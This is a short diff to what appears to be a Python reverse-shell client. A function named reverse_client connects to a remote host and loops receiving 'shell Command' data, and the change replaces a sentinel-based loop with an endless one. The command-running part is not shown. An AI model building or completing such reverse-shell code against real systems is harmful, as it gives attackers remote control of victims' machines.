@@ -10,9 +10,7 @@ def reverse_client(host,port):
 	client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 	client.connect((host,port))
 
-	data = "dummy"
-	
-	while data:
+	while True:
 		#receive shell Command
 		data = client.recv(1024)
 		
